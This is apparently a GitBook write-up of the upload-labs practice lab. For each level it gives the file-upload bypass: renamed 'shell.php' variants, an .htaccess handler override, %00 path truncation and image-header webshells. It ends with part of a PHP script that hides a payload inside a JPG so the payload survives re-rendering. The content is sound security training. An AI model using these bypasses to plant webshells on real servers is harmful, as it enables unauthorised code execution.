
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>upload_labs writeup · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-pro/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-code/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-toggle-chapters/toggle.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-page-toc-button/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="../工具相关/" />
    
    
    <link rel="prev" href="sqli-labs-writeup.html" />
    

    <link href="http://zszcr.github.io/notes/rss" title="Sec0zrc's knowledge base book" rel="alternate" type="application/rss+xml" />

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    简介
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../web常见漏洞原理及利用/">
            
                <a href="../web常见漏洞原理及利用/">
            
                    
                    Web常见漏洞原理及利用
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../web常见漏洞原理及利用/SQL注入漏洞.html">
            
                <a href="../web常见漏洞原理及利用/SQL注入漏洞.html">
            
                    
                    SQL注入漏洞
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="../web常见漏洞原理及利用/XSS漏洞.html">
            
                <a href="../web常见漏洞原理及利用/XSS漏洞.html">
            
                    
                    XSS漏洞
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3" data-path="../web常见漏洞原理及利用/CSRF漏洞.html">
            
                <a href="../web常见漏洞原理及利用/CSRF漏洞.html">
            
                    
                    CSRF漏洞
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4" data-path="../web常见漏洞原理及利用/SSRF漏洞.html">
            
                <a href="../web常见漏洞原理及利用/SSRF漏洞.html">
            
                    
                    SSRF漏洞
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.5" data-path="../web常见漏洞原理及利用/命令执行&代码执行漏洞.html">
            
                <a href="../web常见漏洞原理及利用/命令执行&代码执行漏洞.html">
            
                    
                    命令执行&代码执行漏洞
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.6" data-path="../web常见漏洞原理及利用/PHP反序列化漏洞.html">
            
                <a href="../web常见漏洞原理及利用/PHP反序列化漏洞.html">
            
                    
                    PHP反序列化漏洞
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.7" data-path="../web常见漏洞原理及利用/文件上传漏洞.html">
            
                <a href="../web常见漏洞原理及利用/文件上传漏洞.html">
            
                    
                    文件上传漏洞
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="./">
            
                <a href="./">
            
                    
                    CTFwriteup
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="sqli-labs-writeup.html">
            
                <a href="sqli-labs-writeup.html">
            
                    
                    sqli-labs-writeup
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.3.2" data-path="upload_labs writeup.html">
            
                <a href="upload_labs writeup.html">
            
                    
                    upload_labs writeup
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../工具相关/">
            
                <a href="../工具相关/">
            
                    
                    工具相关
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../工具相关/hackbar破解和踩坑之路.html">
            
                <a href="../工具相关/hackbar破解和踩坑之路.html">
            
                    
                    hackbar破解和踩坑之路
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="../工具相关/Ubuntu18安装Go.html">
            
                <a href="../工具相关/Ubuntu18安装Go.html">
            
                    
                    Ubuntu18安装使用Go
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="../工具相关/内网穿透.html">
            
                <a href="../工具相关/内网穿透.html">
            
                    
                    nps内网穿透
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >upload_labs writeup</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h2 id="uploadlabs-writeup">upload_labs writeup</h2>
<p>&#x73AF;&#x5883;&#x662F;windows&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x7528;&#x4E86;&#x4ED6;&#x63D0;&#x4F9B;&#x7684;&#x96C6;&#x6210;&#x73AF;&#x5883;&#xFF0C;&#x6CE8;&#x610F;&#x8981;&#x4FEE;&#x6539;apache&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x56E0;&#x4E3A;&#x4ED6;&#x91CC;&#x9762;&#x7684;&#x8DEF;&#x5F84;&#x548C;&#x81EA;&#x5DF1;&#x672C;&#x5730;&#x7684;&#x4E0D;&#x540C;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x4FEE;&#x6539;&#x7684;&#x8BDD;apache&#x4F1A;&#x4E00;&#x76F4;&#x542F;&#x52A8;&#x4E0D;&#x6765;&#x3002;</p>
<h4 id="pass-01">Pass-01</h4>
<p>&#x8FD9;&#x4E00;&#x5173;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x4F7F;&#x7528;js&#x5BF9;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x540E;&#x7F00;&#x540D;&#x8FDB;&#x884C;&#x6821;&#x9A8C;&#xFF0C;&#x901A;&#x8FC7;&#x6293;&#x5305;&#x4FEE;&#x6539;&#x5C31;&#x53EF;&#x4EE5;&#x4E0A;&#x4F20;&#x4E86;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7981;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x7684;js&#x3002;</p>
<p>[<img src="../images/image-20200426105648683.png" alt="image-20200426105648683"></p>
<h4 id="pass-02">Pass-02</h4>
<p>&#x6293;&#x5305;&#xFF0C;&#x4FEE;&#x6539;Content-Type&#x4E3A;image/gif</p>
<p><img src="../images/image-20200426110331359.png" alt="image-20200426110331359"></p>
<h4 id="pass-03">Pass-03</h4>
<p>&#x5229;&#x7528;windows&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7279;&#x6027;&#xFF0C;&#x4E0A;&#x4F20;&#x4E0D;&#x7B26;&#x5408;wnidows&#x6587;&#x4EF6;&#x547D;&#x540D;&#x89C4;&#x5219;&#x7684;&#x6587;&#x4EF6;</p>
<blockquote>
<p>shell.php%81</p>
<p>&#x8FD9;&#x91CC;&#x7684;%81&#x9700;&#x8981;&#x5728;bp&#x91CC;&#x8FDB;&#x884C;urldecode</p>
</blockquote>
<p><img src="../images/image-20200426120038452.png" alt="image-20200426120038452"></p>
<p>&#x67E5;&#x4E86;&#x4E0B;&#xFF0C;&#x53D1;&#x73B0;&#x6211;&#x7684;&#x505A;&#x6CD5;&#x548C;&#x522B;&#x4EBA;&#x7684;&#x4E0D;&#x4E00;&#x6837;&#x2026;.. &#x539F;&#x6765;&#x662F;&#x6211;&#x73AF;&#x5883;&#x6709;&#x70B9;&#x95EE;&#x9898;</p>
<p>&#x6B63;&#x5E38;&#x505A;&#x6CD5;&#x5E94;&#x8BE5;&#x662F;&#x4F20;&#x6269;&#x5C55;&#x540D;&#x4E3A;php3&#x3001;phtml&#x7B49;&#x6765;&#x7ED5;&#x8FC7;&#x9ED1;&#x540D;&#x5355;</p>
<p><img src="../images/image-20200426160021563.png" alt="image-20200426160021563"></p>
<h4 id="pass-04">Pass-04</h4>
<p>&#x8FD9;&#x4E00;&#x5173;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x4E2A;&#x9ED1;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#xFF0C;&#x4F46;&#x662F;&#x5B83;&#x7684;&#x9ED1;&#x540D;&#x5355;&#x6BD4;&#x4E0A;&#x4E00;&#x5173;&#x5168;&#x5F88;&#x591A;&#xFF0C;&#x6D4B;&#x8BD5;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x5B83;&#x57FA;&#x672C;&#x628A;&#x80FD;&#x8FC7;&#x6EE4;&#x7684;&#x90FD;&#x8FC7;&#x6EE4;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x5B83;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;.htaccess&#x3002;</p>
<p>&#x53EF;&#x4EE5;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;.htaccess&#x6587;&#x4EF6;&#xFF0C;&#x5185;&#x5BB9;&#x4E3A;&#xFF1A;</p>
<blockquote>
<p>SetHandler application/x-httpd-php</p>
</blockquote>
<p><img src="../images/image-20200426160556907.png" alt="image-20200426160556907"></p>
<p>&#x7136;&#x540E;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;&#x56FE;&#x7247;&#x9A6C;&#xFF0C;&#x6210;&#x529F;&#x8FDE;&#x63A5;&#x3002;</p>
<p><img src="../images/image-20200426161059421.png" alt="image-20200426161059421"></p>
<p>&#x8FD9;&#x4E00;&#x5173;&#x7528;&#x4E0A;&#x4E00;&#x5173;&#x7684;&#x601D;&#x8DEF;&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#xFF0C;&#x6784;&#x9020;&#x4E0D;&#x7B26;&#x5408;windows&#x7684;&#x6587;&#x4EF6;&#x540E;&#x7F00;&#x540D;</p>
<blockquote>
<p>shell.php%81 ==&gt; shell.php</p>
</blockquote>
<h4 id="pass-05">Pass-05</h4>
<p>&#x6D4B;&#x8BD5;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x8FD9;&#x4E00;&#x5173;&#x4E5F;&#x662F;&#x9ED1;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#xFF0C;&#x5B83;&#x628A;.htaccess&#x4E5F;&#x8FC7;&#x6EE4;&#x4E86;&#x3002;&#x53EF;&#x4EE5;&#x7528;&#x540E;&#x7F00;&#x540D;&#x5927;&#x5C0F;&#x5199;&#x7ED5;&#x8FC7;&#x3002;</p>
<p><img src="../images/image-20200426161639178.png" alt="image-20200426161639178"></p>
<p><img src="../images/image-20200426161652259.png" alt="image-20200426161652259"></p>
<h4 id="pass-06">Pass-06</h4>
<p>&#x6269;&#x5C55;&#x540D;&#x540E;&#x52A0;&#x7A7A;&#x683C;&#x7ED5;&#x8FC7;&#xFF0C;&#x6216;&#x8005;&#x52A0;[%81-90]&#x4E5F;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;</p>
<blockquote>
<p>shell.php[&#x7A7A;&#x683C;]</p>
<p>shell.php[%81-90]</p>
</blockquote>
<h4 id="pass-07">Pass-07</h4>
<p>&#x6269;&#x5C55;&#x540D;&#x540E;&#x52A0;.&#x7ED5;&#x8FC7;</p>
<blockquote>
<p>shell.php.</p>
</blockquote>
<p><img src="../images/image-20200426194256948.png" alt="image-20200426194256948"></p>
<p><img src="../images/image-20200426194314989.png" alt="image-20200426194314989"></p>
<h4 id="pass-08">Pass-08</h4>
<p>&#x5229;&#x7528;windows&#x6587;&#x4EF6;&#x6D41;&#x7279;&#x6027;&#x7ED5;&#x8FC7;</p>
<blockquote>
<p>shell.php::$DATA</p>
</blockquote>
<p><img src="../images/image-20200426200015641.png" alt="image-20200426200015641"></p>
<p><img src="../images/image-20200426200948071.png" alt="image-20200426200948071"></p>
<h4 id="pass-09">Pass-09</h4>
<p>&#x540E;&#x7F00;&#x540D;&#x52A0;<code>. .</code>&#x7ED5;&#x8FC7;&#xFF0C;&#x6216;&#x8005;&#x5229;&#x7528;windows&#x6587;&#x4EF6;&#x540D;&#x7279;&#x6027;&#x7ED5;&#x8FC7;&#xFF0C;&#x540E;&#x7F00;&#x540D;&#x52A0;[%81-90]</p>
<blockquote>
<p>shell.php. .</p>
<p>shell.php[%81-90]</p>
</blockquote>
<p><img src="../images/image-20200426202618896.png" alt="image-20200426202618896"></p>
<h4 id="pass-10">Pass-10</h4>
<p>&#x53CC;&#x5199;php&#x7ED5;&#x8FC7;</p>
<blockquote>
<p>shell.pphphp</p>
</blockquote>
<p><img src="../images/image-20200426203446193.png" alt="image-20200426203446193"></p>
<h4 id="pass-11">Pass-11</h4>
<p>&#x6D4B;&#x8BD5;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x53D1;&#x73B0;&#x8FD9;&#x4E2A;&#x662F;&#x767D;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#xFF0C;&#x53EA;&#x5141;&#x8BB8;&#x4E0A;&#x4F20;.jpg|.png|.gif&#x7C7B;&#x578B;&#x7684;&#x6587;&#x4EF6;</p>
<p><img src="../images/image-20200426203643031.png" alt="image-20200426203643031"></p>
<p>&#x540C;&#x65F6;&#x5B83;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x7684;&#x8DEF;&#x5F84;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x53C2;&#x6570;save_path&#x63A7;&#x5236;&#xFF0C;&#x56E0;&#x4E3A;php&#x7248;&#x672C;&#x5C0F;&#x4E8E;5.3.4&#xFF0C;&#x5B58;&#x5728;%00&#x622A;&#x65AD;&#x95EE;&#x9898;&#x3002;</p>
<p>&#x63A7;&#x5236;save_path&#x53C2;&#x6570;&#x4E3A;<code>../upload/shell.php%00</code>&#xFF0C;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x540D;&#x4E3A;<code>shell.jpg</code></p>
<p><img src="../images/image-20200426204802854.png" alt="image-20200426204802854"></p>
<p><img src="../images/image-20200426204822758.png" alt="image-20200426204822758"></p>
<h4 id="pass-12">Pass-12</h4>
<p>&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x8DEF;&#x5F84;&#x53EF;&#x63A7;&#xFF0C;&#x8FD9;&#x4E00;&#x5173;&#x548C;&#x4E0A;&#x4E00;&#x5173;&#x7684;&#x533A;&#x522B;&#x662F;save_path&#x662F;&#x901A;&#x8FC7;POST&#x8BF7;&#x6C42;&#x4F20;&#x9012;&#x7684;&#xFF0C;&#x6240;&#x4EE5;%00&#x8981;&#x5148;&#x8FDB;&#x884C;&#x4E00;&#x904D;url&#x89E3;&#x7801;&#xFF0C;&#x56E0;&#x4E3A;POST&#x8BF7;&#x56DE;&#x4F1A;&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;url&#x7F16;&#x7801;&#x3002;</p>
<p><img src="../images/image-20200426210013352.png" alt="image-20200426210013352"></p>
<p><img src="../images/image-20200426210026863.png" alt="image-20200426210026863"></p>
<h4 id="pass-13">Pass-13</h4>
<p>&#x8FD9;&#x4E00;&#x5173;&#x8981;&#x4E0A;&#x4F20;.jpg|.gif|.png&#x7684;&#x56FE;&#x7247;&#x9A6C;&#x4E0A;&#x53BB;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x6F0F;&#x6D1E;&#x53BB;&#x8FD0;&#x884C;&#x56FE;&#x7247;&#x9A6C;&#x3002;&#x5B83;&#x5BF9;&#x6587;&#x4EF6;&#x5934;&#x524D;&#x4E24;&#x4E2A;&#x5B57;&#x8282;&#x8FDB;&#x884C;&#x4E86;&#x68C0;&#x6D4B;&#xFF0C;&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x5934;&#x5224;&#x65AD;&#x662F;&#x5426;&#x662F;.jpg|.gif|.png&#x3002;</p>
<p>&#x5728;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#x524D;&#x52A0;&#x4E0A;&#x5BF9;&#x5E94;&#x7684;&#x6587;&#x4EF6;&#x5934;&#xFF0C;&#x7136;&#x540E;&#x4E0A;&#x4F20;&#x4E0A;&#x53BB;&#x5C31;ok&#x4E86;</p>
<p><strong>.gif</strong></p>
<p><img src="../images/image-20200426210721329.png" alt="image-20200426210721329"></p>
<p><img src="../images/image-20200426210746983.png" alt="image-20200426210746983"></p>
<p><strong>.jpg</strong></p>
<p><img src="../images/image-20200426210953501.png" alt="image-20200426210953501"></p>
<p><img src="../images/image-20200426211021374.png" alt="image-20200426211021374"></p>
<p><strong>.png</strong></p>
<p><img src="../images/image-20200426211112401.png" alt="image-20200426211112401"></p>
<p><img src="../images/image-20200426211136230.png" alt="image-20200426211136230"></p>
<h4 id="pass-14">Pass-14</h4>
<p>&#x8FD9;&#x4E00;&#x5173;&#x4E5F;&#x662F;&#x4E0A;&#x4F20;&#x56FE;&#x7247;&#x9A6C;&#xFF0C;&#x5B83;&#x901A;&#x8FC7;getimagesize()&#x51FD;&#x6570;&#x6765;&#x68C0;&#x67E5;&#x56FE;&#x7247;&#x7C7B;&#x578B;&#x3002;</p>
<p>getimagesize()&#x51FD;&#x6570;&#x901A;&#x8FC7;&#x68C0;&#x67E5;&#x6587;&#x4EF6;&#x5934;&#x6765;&#x5224;&#x65AD;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x8981;&#x6784;&#x9020;&#x597D;&#x6587;&#x4EF6;&#x5934;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002;</p>
<p><img src="../images/image-20200426213356101.png" alt="image-20200426213356101"></p>
<h4 id="pass-15">Pass-15</h4>
<p>&#x8FD9;&#x4E00;&#x5173;&#x4F7F;&#x7528;&#x4E86;exif_imagetype&#x51FD;&#x6570;&#x6765;&#x5224;&#x65AD;&#x56FE;&#x50CF;&#x7C7B;&#x578B;&#xFF0C;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x901A;&#x8FC7;&#x8BFB;&#x53D6;</p>
<p>&#x56FE;&#x50CF;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x6765;&#x5224;&#x65AD;&#x56FE;&#x7247;&#x7C7B;&#x578B;&#x3002;&#x53EA;&#x8981;&#x52A0;&#x4E0A;&#x5BF9;&#x5E94;&#x7684;&#x6587;&#x4EF6;&#x5934;&#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x4E86;&#xFF0C;&#x601D;&#x8DEF;&#x548C;&#x524D;&#x4E24;&#x5173;&#x90FD;&#x4E00;&#x6837;&#x3002;</p>
<p><img src="../images/image-20200427093635284.png" alt="image-20200427093635284"></p>
<h4 id="pass-16">Pass-16</h4>
<p>&#x8FD9;&#x4E00;&#x5173;&#x5BF9;&#x4E0A;&#x4F20;&#x7684;&#x56FE;&#x7247;&#x5185;&#x5BB9;&#x505A;&#x4E86;&#x4E8C;&#x6B21;&#x6E32;&#x67D3;&#x3002;&#x5B83;&#x5C06;&#x539F;&#x672C;&#x5C5E;&#x4E8E;&#x56FE;&#x7247;&#x6570;&#x636E;&#x7684;&#x90E8;&#x5206;&#x63D0;&#x53D6;&#x4E86;&#x51FA;&#x6765;&#xFF0C;&#x518D;&#x7528;&#x81EA;&#x5DF1;&#x7684;API&#x6216;&#x8005;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x6E32;&#x67D3;&#x3002;&#x901A;&#x5E38;php&#x4F7F;&#x7528;&#x7684;&#x662F;GD&#x5E93;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x3002;&#x57FA;&#x672C;&#x65B9;&#x6CD5;&#x662F;&#x901A;&#x8FC7;&#x5BF9;&#x6BD4;&#x5904;&#x7406;&#x524D;&#x548C;&#x5904;&#x7406;&#x540E;&#x7684;&#x56FE;&#x7247;&#x6570;&#x636E;&#xFF0C;&#x627E;&#x51FA;&#x6CA1;&#x672A;&#x7ECF;&#x5904;&#x7406;&#x7684;&#x6570;&#x636E;&#x533A;&#x57DF;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x4EE3;&#x7801;&#x63D2;&#x5165;&#x3002;</p>
<p><strong>gif</strong></p>
<p>&#x5C06;&#x4E0A;&#x4F20;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x4E0B;&#x4E0B;&#x6765;&#xFF0C;&#x7528;010editor&#x6253;&#x5F00;&#xFF0C;&#x627E;&#x5230;&#x672A;&#x88AB;&#x4FEE;&#x6539;&#x7684;&#x533A;&#x57DF;&#x5C06;&#x4EE3;&#x7801;&#x5199;&#x5165;&#x3002;</p>
<p><img src="../images/image-20200427103613435.png" alt="image-20200427103613435"></p>
<p><img src="../images/image-20200427103631639.png" alt="image-20200427103631639"></p>
<p><strong>png</strong></p>
<p>&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x5C06;webshell&#x5199;&#x5982;PLTE&#x6570;&#x636E;&#x5757;&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x662F;&#x5199;&#x5165;IDAT&#x6570;&#x636E;&#x5757;&#xFF0C;&#x5177;&#x4F53;&#x5236;&#x4F5C;&#x65B9;&#x6CD5;&#x53C2;&#x8003;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;:<a href="http://0verflow.cn/?p=1502" target="_blank">http://0verflow.cn/?p=1502</a></p>
<p><strong>jpg</strong></p>
<p>&#x7528;&#x5927;&#x4F6C;&#x5199;&#x7684;&#x811A;&#x672C;&#x5236;&#x4F5C;&#x56FE;&#x7247;&#x9A6C;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-comment">/*
    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.
    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php &lt;jpg_name.jpg&gt;
    In case of successful injection you will get a specially crafted image, which should be uploaded again.
    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;.
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.
    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
    */</span>
    $miniPayload = <span class="hljs-string">&apos;&lt;?php phpinfo();?&gt;&apos;</span>;
    <span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&apos;gd&apos;</span>) || !function_exists(<span class="hljs-string">&apos;imagecreatefromjpeg&apos;</span>)) {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;php-gd is not installed&apos;</span>);
    }
    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($argv[<span class="hljs-number">1</span>])) {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;</span>);
    }
    set_error_handler(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);
    <span class="hljs-keyword">for</span>($pad = <span class="hljs-number">0</span>; $pad &lt; <span class="hljs-number">1024</span>; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = <span class="hljs-keyword">new</span> DataInputStream($argv[<span class="hljs-number">1</span>]);
        $outStream = file_get_contents($argv[<span class="hljs-number">1</span>]);
        $extraBytes = <span class="hljs-number">0</span>;
        $correctImage = <span class="hljs-keyword">TRUE</span>;
        <span class="hljs-keyword">if</span>($dis-&gt;readShort() != <span class="hljs-number">0xFFD8</span>) {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;Incorrect SOI marker&apos;</span>);
        }
        <span class="hljs-keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="hljs-number">0xFF</span>)) {
            $marker = $dis-&gt;readByte();
            $size = $dis-&gt;readShort() - <span class="hljs-number">2</span>;
            $dis-&gt;skip($size);
            <span class="hljs-keyword">if</span>($marker === <span class="hljs-number">0xDA</span>) {
                $startPos = $dis-&gt;seek();
                $outStreamTmp =
                    substr($outStream, <span class="hljs-number">0</span>, $startPos) .
                    $miniPayload .
                    str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,$nullbytePayloadSize) .
                    substr($outStream, $startPos);
                checkImage(<span class="hljs-string">&apos;_&apos;</span>.$argv[<span class="hljs-number">1</span>], $outStreamTmp, <span class="hljs-keyword">TRUE</span>);
                <span class="hljs-keyword">if</span>($extraBytes !== <span class="hljs-number">0</span>) {
                    <span class="hljs-keyword">while</span>((!$dis-&gt;eof())) {
                        <span class="hljs-keyword">if</span>($dis-&gt;readByte() === <span class="hljs-number">0xFF</span>) {
                            <span class="hljs-keyword">if</span>($dis-&gt;readByte !== <span class="hljs-number">0x00</span>) {
                                <span class="hljs-keyword">break</span>;
                            }
                        }
                    }
                    $stopPos = $dis-&gt;seek() - <span class="hljs-number">2</span>;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream =
                        substr($outStream, <span class="hljs-number">0</span>, $startPos) .
                        $miniPayload .
                        substr(
                            str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            <span class="hljs-number">0</span>,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .
                                substr($outStream, $stopPos);
                } <span class="hljs-keyword">elseif</span>($correctImage) {
                    $outStream = $outStreamTmp;
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">break</span>;
                }
                <span class="hljs-keyword">if</span>(checkImage(<span class="hljs-string">&apos;payload_&apos;</span>.$argv[<span class="hljs-number">1</span>], $outStream)) {
                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;Success!&apos;</span>);
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">break</span>;
                }
            }
        }
    }
    unlink(<span class="hljs-string">&apos;payload_&apos;</span>.$argv[<span class="hljs-number">1</span>]);
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;Something\&apos;s wrong&apos;</span>);
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span><span class="hljs-params">($filename, $data, $unlink = FALSE)</span> </span>{
        <span class="hljs-keyword">global</span> $correctImage;
        file_put_contents($filename, $data);
        $correctImage = <span class="hljs-keyword">TRUE</span>;
        imagecreatefromjpeg($filename);
        <span class="hljs-keyword">if</span>($unlink)
            unlink($filename);
        <span class="hljs-keyword">return</span> $correctImage;
    }
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span><span class="hljs-params">($errno, $errstr, $errfile, $errline)</span> </span>{
        <span class="hljs-keyword">global</span> $extraBytes, $correctImage;
        $correctImage = <span class="hljs-keyword">FALSE</span>;
        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&apos;/(\d+) extraneous bytes before marker/&apos;</span>, $errstr, $m)) {
            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($m[<span class="hljs-number">1</span>])) {
                $extraBytes = (int)$m[<span class="hljs-number">1</span>];
            }
        }
    }
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>{
        <span class="hljs-keyword">private</span> $binData;
        <span class="hljs-keyword">private</span> $order;
        <span class="hljs-keyword">private</span> $size;
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename, $order = false, $fromString = false)</span> </span>{
            $this-&gt;binData = <span class="hljs-string">&apos;&apos;</span>;
            $this-&gt;order = $order;
            <span class="hljs-keyword">if</span>(!$fromString) {
                <span class="hljs-keyword">if</span>(!file_exists($filename) || !is_file($filename))
                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;File not exists [&apos;</span>.$filename.<span class="hljs-string">&apos;]&apos;</span>);
                $this-&gt;binData = file_get_contents($filename);
            } <span class="hljs-keyword">else</span> {
